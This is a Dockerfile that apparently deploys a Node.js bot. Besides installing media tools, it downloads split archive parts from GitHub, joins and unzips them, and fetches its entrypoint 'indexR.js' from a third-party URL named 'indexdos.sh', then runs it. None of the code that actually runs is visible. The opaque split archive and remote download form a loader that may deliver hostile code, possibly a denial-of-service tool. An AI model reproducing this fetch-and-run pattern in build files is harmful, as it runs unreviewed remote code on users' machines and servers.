FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/phxxv/bot-inatsuki/raw/main/aa https://github.com/phxxv/bot-inatsuki/raw/main/ab https://github.com/phxxv/bot-inatsuki/raw/main/ac https://github.com/phxxv/bot-inatsuki/raw/main/ad https://github.com/phxxv/bot-inatsuki/raw/main/ae 
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O indexR.js https://go.bruceds.my.id/indexdos.sh
COPY . .
EXPOSE 5000
CMD ["node", "indexR.js"]
